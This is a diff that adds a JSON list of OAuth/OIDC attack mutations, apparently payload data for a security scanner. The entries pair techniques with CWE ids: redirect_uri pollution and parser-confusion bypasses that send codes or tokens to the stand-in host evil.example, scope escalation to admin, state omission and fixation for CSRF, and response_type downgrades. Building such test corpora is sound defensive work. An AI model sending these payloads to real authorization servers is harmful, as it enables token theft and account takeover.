@@ -1,0 +1,131 @@
+[
+  {
+    "id": "redirect_uri_duplicate_param",
+    "param": "redirect_uri",
+    "technique": "http_parameter_pollution",
+    "intent": "Send redirect_uri twice (legit first, attacker second). AS validates one occurrence but redirects using the other.",
+    "mutation": "redirect_uri={ORIGINAL}&redirect_uri=https://evil.example/cb",
+    "attacker_host": "evil.example",
+    "cwe": "CWE-235"
+  },
+  {
+    "id": "redirect_uri_duplicate_param_reversed",
+    "param": "redirect_uri",
+    "technique": "http_parameter_pollution",
+    "intent": "Attacker value first, legit second; targets servers that validate the last occurrence but use the first.",
+    "mutation": "redirect_uri=https://evil.example/cb&redirect_uri={ORIGINAL}",
+    "attacker_host": "evil.example",
+    "cwe": "CWE-235"
+  },
+  {
+    "id": "redirect_uri_appended_path",
+    "param": "redirect_uri",
+    "technique": "redirect_uri_validation_bypass",
+    "intent": "Append attacker path/segment to a prefix-matched registered URI.",
+    "mutation": "redirect_uri={ORIGINAL}/../../evil",
+    "attacker_host": "{ORIGINAL_HOST}",
+    "cwe": "CWE-601"
+  },
+  {
+    "id": "redirect_uri_open_redirect_chain",
+    "param": "redirect_uri",
+    "technique": "open_redirect_in_oauth",
+    "intent": "Use a known open-redirect ON the registered host to bounce the code to attacker (registered URI passes validation).",
+    "mutation": "redirect_uri={ORIGINAL}?next=https://evil.example",
+    "attacker_host": "evil.example",
+    "cwe": "CWE-601"
+  },
+  {
+    "id": "redirect_uri_subdomain_takeover",
+    "param": "redirect_uri",
+    "technique": "redirect_uri_validation_bypass",
+    "intent": "Attacker-controlled subdomain of the registered domain (dangling DNS / wildcard registration).",
+    "mutation": "redirect_uri=https://attacker.{ORIGINAL_HOST}/cb",
+    "attacker_host": "attacker.{ORIGINAL_HOST}",
+    "cwe": "CWE-601"
+  },
+  {
+    "id": "redirect_uri_userinfo_at_bypass",
+    "param": "redirect_uri",
+    "technique": "url_parser_confusion",
+    "intent": "Use @ so naive validators read the registered host as userinfo and the real host is the attacker.",
+    "mutation": "redirect_uri=https://{ORIGINAL_HOST}@evil.example/cb",
+    "attacker_host": "evil.example",
+    "cwe": "CWE-601"
+  },
+  {
+    "id": "redirect_uri_backslash_parser_confusion",
+    "param": "redirect_uri",
+    "technique": "url_parser_confusion",
+    "intent": "Backslash trickery (https://evil.example\\@registered) exploits parser disagreement (WHATWG vs RFC3986).",
+    "mutation": "redirect_uri=https://evil.example\\@{ORIGINAL_HOST}/cb",
+    "attacker_host": "evil.example",
+    "cwe": "CWE-601"
+  },
+  {
+    "id": "redirect_uri_localhost_bypass",
+    "param": "redirect_uri",
+    "technique": "redirect_uri_validation_bypass",
+    "intent": "Some AS allow any localhost/loopback redirect for 'native' clients; pair with @ to reach attacker.",
+    "mutation": "redirect_uri=https://127.0.0.1:1@evil.example/cb",
+    "attacker_host": "evil.example",
+    "cwe": "CWE-601"
+  },
+  {
+    "id": "scope_duplicate_escalation",
+    "param": "scope",
+    "technique": "http_parameter_pollution",
+    "intent": "Send scope twice to smuggle elevated scopes past a consent screen that displays the first value.",
+    "mutation": "scope=openid+profile&scope=openid+profile+admin+offline_access",
+    "cwe": "CWE-269"
+  },
+  {
+    "id": "scope_escalation_injection",
+    "param": "scope",
+    "technique": "scope_manipulation",
+    "intent": "Append privileged scopes the AS does not strip (e.g. admin, write:all, offline_access).",
+    "mutation": "scope=openid+profile+email+admin+write:all+offline_access",
+    "cwe": "CWE-269"
+  },
+  {
+    "id": "scope_separator_confusion",
+    "param": "scope",
+    "technique": "scope_manipulation",
+    "intent": "Mix separators (space, comma, %20, +) so the consent parser and the grant parser disagree on scope set.",
+    "mutation": "scope=openid%20profile,admin",
+    "cwe": "CWE-269"
+  },
+  {
+    "id": "state_omitted_csrf",
+    "param": "state",
+    "technique": "csrf_login",
+    "intent": "Drop state entirely; if the AS/client still completes the flow, the callback is CSRF-able (login CSRF / code injection).",
+    "mutation": "<omit state parameter>",
+    "cwe": "CWE-352"
+  },
+  {
+    "id": "state_duplicate_fixation",
+    "param": "state",
+    "technique": "http_parameter_pollution",
+    "intent": "Send state twice to fixate/confuse the value the client stores vs the one it later checks.",
+    "mutation": "state={CLIENT_STATE}&state=attacker-fixed-state",
+    "cwe": "CWE-352"
+  },
+  {
+    "id": "response_type_downgrade",
+    "param": "response_type",
+    "technique": "response_type_confusion",
+    "intent": "Pollute response_type (code token, token, id_token) to coerce an implicit-style response that leaks tokens in the URL fragment to the redirect.",
+    "mutation": "response_type=code&response_type=token",
+    "cwe": "CWE-601"
+  },
+  {
+    "id": "response_mode_form_post_to_attacker",
+    "param": "response_mode",
+    "technique": "response_mode_confusion",
+    "intent": "Force response_mode=form_post combined with a polluted redirect to POST the code/token to the attacker host.",
+    "mutation": "response_mode=form_post&redirect_uri=https://evil.example/cb",
+    "attacker_host": "evil.example",
+    "cwe": "CWE-601"
+  }
+]
